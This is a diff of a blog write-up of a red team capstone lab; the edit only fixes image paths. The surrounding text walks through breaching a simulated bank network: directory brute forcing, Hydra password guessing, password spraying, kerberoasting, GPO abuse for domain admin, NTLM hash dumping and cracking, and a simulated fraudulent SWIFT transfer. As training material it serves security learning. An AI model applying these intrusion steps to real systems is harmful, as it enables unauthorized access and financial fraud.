@@ -90,7 +90,7 @@ Please make sure you understand the points below before starting. If any point i
 - There are rules in place that determine what you are allowed and disallowed to do. Failure to adhere to these rules might result in a ban from the challenge.
 - After gaining access to the network, you need to register for the challenge through e-Citizen communication portal using provided SSH details.
 - You will need to prove compromises by performing specific steps on the host that you have compromised. These steps will be provided to you through the e-Citizen portal.
-![Untitled](/assets/N-RedTeamCC\08d12c36-9c71-4668-8f59-1d9adf1d5725.png)
+![Untitled](/assets/N-RedTeamCC/08d12c36-9c71-4668-8f59-1d9adf1d5725.png)
 
 # Preparations
 ## Capstone Challenge Resources
@@ -173,7 +173,7 @@ keith allen
 mohammad ahmed
 ```
 Also, looking at the image name gave us hints about the email creation rules that are being used by the organization: `firstname.lastname@domain.com`
-![Untitled](/assets/N-RedTeamCC\Untitled.png)
+![Untitled](/assets/N-RedTeamCC/Untitled.png)
 
 ### Directory Brute forcing
 
@@ -193,7 +193,7 @@ Target: http://10.200.113.13/
 [14:22:08] Starting:                                            
 [14:23:39] 200 -   24KB - /info.php                                        
 ```
-![Untitled](/assets/N-RedTeamCC\Untitled%201.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%201.png)
 Great! There is an exposed PHP info file that is leaking so much info about this web server. Using a plugin for the browser called Wappalyzer, we can check on the technologies used by the server, including their versions. October CMS is being used, so let's brute force its directory.
 ```bash
 ┌──(root㉿kali)-[/opt/dirsearch]
@@ -236,7 +236,7 @@ Target: http://10.200.113.13/
 [14:34:13] 200 -  132KB - /october/vendor/composer/installed.json     
 ```
 Going through the discovered paths indicating that there are so many directory listing in this web server but one of them caught my eyes! `http://10.200.113.13/october/modules/`
-![Untitled](/assets/N-RedTeamCC\Untitled%202.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%202.png)
 Going through the backend files, it tells us that there is an administration panel, but what is its path? With the help of brute forcing and guessing, I was able to discover the correct path for the administration panel.
 ```bash
 python3 dirsearch.py -u 10.200.113.13/october/index.php/ -e php --random-agent                   
@@ -256,8 +256,8 @@ Target: http://10.200.113.13/
 [15:07:59] 200 -  965B  - /october/index.php/error                          
 [15:08:00] 200 -  965B  - /october/index.php/error/     
 ```
-![Untitled](/assets/N-RedTeamCC\Untitled%203.png)
-![Untitled](/assets/N-RedTeamCC\Untitled%204.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%203.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%204.png)
 Hmm! But what could be the username and the password for this? Let’s resume our enumeration for other exposed IPs, such as the VPN and Mail Server.
 
 ## VPN Machine
@@ -277,7 +277,7 @@ PORT STATE SERVICE
 
 ### The Web Page
 a normal login page, but if we got any creds we will get access to the Internal Network.
-![Untitled](/assets/N-RedTeamCC\Untitled%205.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%205.png)
 
 ### Directory Brute forcing
 ```bash
@@ -300,7 +300,7 @@ Target: http://10.200.113.12/
 [15:51:30] 200 -  462B  - /vpn/  
 ```
 The `/vpn/` directory only contains an `.ovpn` open VPN config file.
-![Untitled](/assets/N-RedTeamCC\ef9e13af-12ae-4595-897c-0bd7f1ac21e8.png)
+![Untitled](/assets/N-RedTeamCC/ef9e13af-12ae-4595-897c-0bd7f1ac21e8.png)
 hmm! What could this ovpn file give us access to? Let’s try to connect and see.
 ```bash
 (root㉿kali)-[~/THM/N-RedTeamCC]
@@ -454,7 +454,7 @@ PORT      STATE  SERVICE       VERSION
 ```
 
 ### The Web Page
-![Untitled](/assets/N-RedTeamCC\Untitled%206.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%206.png)
 
 ### Directory Brute forcing
 ```bash
@@ -494,11 +494,11 @@ $ mv thunderbird /opt
 $ sudo ln -s /opt/thunderbird/thunderbird /usr/local/bin/thunderbird
 ```
 Then run the **thunderbird** app and click on Set Up an Existing Email. Adding the password that we received earlier and connecting
-![Untitled](/assets/N-RedTeamCC\Untitled%207.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%207.png)
 Once connected, we will find the following message:
-![Untitled](/assets/N-RedTeamCC\Untitled%208.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%208.png)
 I have tried to send emails to others members to see If I could phish other users and get access, but it gives me the following error:
-![Untitled](/assets/N-RedTeamCC\Untitled%209.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%209.png)
 
 ### Password Mangling
 It seems that we are running out of options. The last thing that I can think of is brute forcing. At the beginning of the challenge, we have been provided with `password_base_list.txt` that contains some sample passwords:
@@ -606,7 +606,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-21 14:31:
 1 of 1 target successfully completed, 2 valid passwords found
 ```
 Yess!! We have a valid creds. I thought of accessing their mailbox might lead to sensitive information, but it is EMPTY :)
-![Untitled](/assets/N-RedTeamCC\Untitled%2010.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2010.png)
 
 ### Password Spraying
 Hmm! Since there are no emails in their inbox, let’s try to spray those valid creds on the available services. I have tried those creds against the following: 
@@ -636,7 +636,7 @@ let’s access them and see what is inside.
 ```bash
 $ xfreerdp /u:mohammad.ahmed /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.113.21 /drive:share,/opt/
 ```
-![Untitled](/assets/N-RedTeamCC\Untitled%2011.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2011.png)
 
 **Submitting Flags**
 ```bash
@@ -705,13 +705,13 @@ ItsFadinG.txt                                                                   
 
 Well done! Check your email!
 ```
-![Untitled](/assets/N-RedTeamCC\Untitled%2012.png)
-![Untitled](/assets/N-RedTeamCC\Untitled%2013.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2012.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2013.png)
 We are now able to obtain the following flags:
 ***- Flag 1, Breaching the Perimeter***
 ***- Flag 2, Breaching Active Directory***
 ***- Flag 3, Foothold on Corporate Division Tier 2 Infrastructure***
-![Untitled](/assets/N-RedTeamCC\Untitled%2014.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2014.png)
 
 # Administrative access to Corporate Division Tier 2 Infrastructure
 ## WRK1 Machine
@@ -1257,7 +1257,7 @@ Closing writers
 2024-06-27T19:14:29.1181271+00:00|INFORMATION|SharpHound Enumeration Completed at 7:14 PM on 6/27/2024! Happy Graphing!
 ```
 As we have recently compromised the SvcScanning user via a kerberoasting attack, let’s choose the option ***"Shortest Path From kerberoastable Users."***
-![Untitled](/assets/N-RedTeamCC\70923f00-e58f-4f92-9811-13f64d4f776b.png)
+![Untitled](/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png)
 GREAAAT! It seems that the svcScanning user is a member of the `services@corp.thereserve.loc` and has the permission to execute remote PowerShell commands on the `server2.corp.thereserve.loc` computer.
 
 ## SERVER2 Machine
@@ -1321,9 +1321,9 @@ We are now able to obtain the following flags:
 ## SERVER2 Machine
 ## Exploiting GPO GenericWrite
 Since we got access to SERVER1 and SERVER2, let’s execute the attack vector that was suggested by Bloodhound.
-![Untitled](/assets/N-RedTeamCC\70923f00-e58f-4f92-9811-13f64d4f776b.png)
+![Untitled](/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png)
  As `SvcScanning`user has GenericWrite permission over the DC Backups group policy which is linked with the Domain Controllers group and the CORPDC Machine. Meaning, if we were able to exploit it, we will get access to the DC machine. Let’s first open MMC and add the group policy management snap in. then choose the DC Backup Policy and edit.
-![Untitled](/assets/N-RedTeamCC\Untitled%2015.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2015.png)
 Hmm! Unfortunately, I wasn’t able to edit the policy and wasn’t sure why; it took me lots of time to figure it out. It appears that I need to run MMC with a Local System account privilege, but I was running it with an administrator account. To do that, we could use `psexec64.exe` to run a cmd as a system account, then open the MMC.
 ```powershell
 PS C:\Windows\Tasks> cp \\tsclient\share\psexec64.exe .
@@ -1346,7 +1346,7 @@ nt authority\system
 C:\Windows\system32> mmc
 ```
 Editing the policy and adding our svcScanning user to the Domain Admins and Domain Controllers group via the Restricted Groups policy.
-![Untitled](/assets/N-RedTeamCC\Untitled%2016.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2016.png)
 Updating the GPO and checking our privileges.
 ```powershell
 PS C:\Users\svcScanning> gpupdate.exe /force
@@ -1368,7 +1368,7 @@ The command completed successfully.
 Woo! Now we can RDP to the DC machine, and we are now Domain Admins and OWN the whole Domain. We are now able to obtain the following flag:
 ***- Flag-7: Foothold on Corporate Division Tier 0 Infrastructure***
 ***- Flag-8: Administrative access to Corporate Division Tier 0 Infrastructure***
-![Untitled](/assets/N-RedTeamCC\d9ab914b-c1ac-4de2-a2f7-8efa8b2c5ede.png)
+![Untitled](/assets/N-RedTeamCC/d9ab914b-c1ac-4de2-a2f7-8efa8b2c5ede.png)
 
 # Full Compromise of ROOTDC
 ## CORPDC Machine
@@ -1413,7 +1413,7 @@ bank.thereserve.loc thereserve.loc ParentChild  Bidirectional
 
 Let’s simplify it with the following diagram:
 
-![Untitled](/assets/N-RedTeamCC\trustissue.png)
+![Untitled](/assets/N-RedTeamCC/trustissue.png)
 
 As the CORP child trusts the ROOT domain and the BANK domain also trusts the ROOT domain also, then both the CORP and BANK domains will trust each other as the trust type is transitive. Therefore, if we compromise a child domain, we can access the other child domain.
 
@@ -1616,7 +1616,7 @@ Connecting again with the administrator user:
 ┌──(root㉿kali)-[/tmp/aaa]
 └─$ proxychains -q -f proxychains4.conf xfreerdp /u:Administrator /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.101  
 ```
-![Untitled](/assets/N-RedTeamCC\Untitled%2018.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2018.png)
 Since we have an administrator account then all child domains are owned now and their flags can be submitted.
 ***- Flag 9, Foothold on Bank Division Tier 2 Infrastructure***
 ***- Flag 10, Administrative access to Bank Division Tier 2 Infrastructure***
@@ -1624,7 +1624,7 @@ Since we have an administrator account then all child domains are owned now and 
 ***- Flag 12, Administrative access to Bank Division Tier 1 Infrastructure***
 ***- Flag 13, Foothold on Bank Division Tier 0 Infrastructure***
 ***- Flag 14, Administrative access to Bank Division Tier 0 Infrastructure***
-![Untitled](/assets/N-RedTeamCC\Untitled%2019.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2019.png)
 
 # Compromise of SWIFT and Payment Transfer
 ## BANKDC Machine
@@ -1694,7 +1694,7 @@ PS C:\Users\ItsFadinG> hostname
 JMP
 ```
 Let’s access the SWIFT web application:
-![Untitled](/assets/N-RedTeamCC\Untitled%2020.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2020.png)
 
 ### Dynamic Port Forwarding
 For better application inspection with Burp Suite, we could use Dynamic port forwarding to access this Swift web app from our attacking machine.
@@ -1731,17 +1731,17 @@ Using these details, perform the following steps:
 4. Issue the transfer for the full 10 million dollars
 5. Once completed, request verification of your transaction here (No need to check your email once the transfer has been created).
 ```
-![Untitled](/assets/N-RedTeamCC\Untitled%2021.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2021.png)
 We received a PIN in our email and using it we can confirm that our transaction was initiated.
-![Untitled](/assets/N-RedTeamCC\Untitled%2022.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2022.png)
 We have received flag 17, but after that we have received an important email:
-![Untitled](/assets/N-RedTeamCC\Untitled%2023.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2023.png)
 As stated, we need to have a capturer and approver account to be able to create our own transfer from start to finish and show impact.
 
 ### SWIFT Capturer and Capturer Access
 
 If you remember from our previous enumeration, we have found two interesting groups and added our users to them **( Payment Approvers - Payment Capturers ).** Let’s try to log in to the application using our domain username:
-![Untitled](/assets/N-RedTeamCC\Untitled%2024.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2024.png)
 Unfortunately, it didn’t work. Let’s check the other user, then change his password and try to login again.
 ```powershell
 PS C:\Users\ItsFadinG> net group "Payment Capturers" /domain
@@ -1772,7 +1772,7 @@ The request will be processed at a domain controller for domain bank.thereserve.
 The command completed successfully.
 ```
 But it didn’t work also:
-![Untitled](/assets/N-RedTeamCC\Untitled%2025.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2025.png)
 Hmm! This suggests that some users may be using different credentials for the SWIFT web app other than their active directory password. But other users may use the same password for both. So let’s try to dump all users’ passwords and crack them.
 ```bash
 # Filtering for users that are only part of the Payment Approvers and Payment Capturers groups
@@ -1803,8 +1803,8 @@ Only one NTLM hash has been cracked, but luckily, three users are using the same
 **c.young**:1277:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
 ```
 let’s try to access the SWIFT web app with these creds only the **c.young** user worked as a Capturer user:
-![Untitled](/assets/N-RedTeamCC\3a9feb96-870a-4110-8b2f-2e2477fa7e49.png)
-![Untitled](/assets/N-RedTeamCC\Untitled%2026.png)
+![Untitled](/assets/N-RedTeamCC/3a9feb96-870a-4110-8b2f-2e2477fa7e49.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2026.png)
 Now we can submit:
 - ***Flag-18: Access to SWIFT application as capturer***
 ```bash
@@ -1817,7 +1817,7 @@ TO:     66a23d8e984e4a04f6a2e06d
 
 Look for this transfer and capture (forward) the transaction.
 ```
-![Untitled](/assets/N-RedTeamCC\Untitled%2027.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2027.png)
 Click forward, and we have received our flag! Now we need to get access to an Approver account. Since we have cracked three accounts, one of which is only part of the Payment Approvers group, let’s connect to the JMP machine using a.turner user.
 ```bash
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC\proxychains]
@@ -1831,7 +1831,7 @@ Click forward, and we have received our flag! Now we need to get access to an Ap
 [15:07:49:623] [1114772:1114790] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
 ```
 Surprise! It seems that Alison Turner has a bad memory, he has saved his password and has an open session on the JMP machine.
-![Untitled](/assets/N-RedTeamCC\Untitled%2028.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2028.png)
 let’s submit ***Flag-19: Access to SWIFT application as approver***
 ```bash
 In order to proof that you have approver access to the SWIFT system, a dummy transaction has been created for you.
@@ -1843,7 +1843,7 @@ TO:     66a23d8e984e4a04f6a2e06d
 
 Look for this transfer and approve (forward) the transaction.
 ```
-![Untitled](/assets/N-RedTeamCC\Untitled%2029.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2029.png)
 
 ### SWIFT Simulated Fraudulent Transfer
 We are one step away from our final goal and the last flag, ***Flag-20: Simulated fraudulent transfer made***.
@@ -1858,22 +1858,22 @@ Once done, follow these steps:
 ```
 **Verifying The Transaction**
 from `ItsFadinG@destination.loc` email
-![Untitled](/assets/N-RedTeamCC\Untitled%2030.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2030.png)
 **Capture the Verified Transaction**
 from  `c.young@bank.thereserve.loc` email:
-![Untitled](/assets/N-RedTeamCC\Untitled%2031.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2031.png)
 **Approve The Captured Transaction**
 from the `a.turner@bank.thereserve.loc` email:
-![Untitled](/assets/N-RedTeamCC\Untitled%2032.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2032.png)
 Let’s check the status of our transaction:
-![Untitled](/assets/N-RedTeamCC\Untitled%2033.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2033.png)
 And We Hacked the Bank!!
-![Untitled](/assets/N-RedTeamCC\Untitled%2034.png)
-![Untitled](/assets/N-RedTeamCC\Untitled%2035.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2034.png)
+![Untitled](/assets/N-RedTeamCC/Untitled%2035.png)
 
 # Summary
 As Pivoting is a crucial step in any red team engagements, and it is a bit hard to follow. I decided to create a summary of my port forwarding methodology, which exclusively utilized Dynamic SSH Port Forwarding. This approach enabled secure, flexible access to internal network resources, playing a pivotal role in my overall strategy.
-![Untitled](/assets/N-RedTeamCC\PF-Summary.png)
+![Untitled](/assets/N-RedTeamCC/PF-Summary.png)
 
 # Conclusion
 Completing the RedTeam Capstone Challenge was a journey that took me over two months, balanced alongside my military service. By sharing not only the direct solutions but also my failed attempts, I aimed to provide a more immersive experience. I hope you enjoyed it. Thank you for following along with my writeup. I welcome any feedback you may have. Until next time, Peace!!
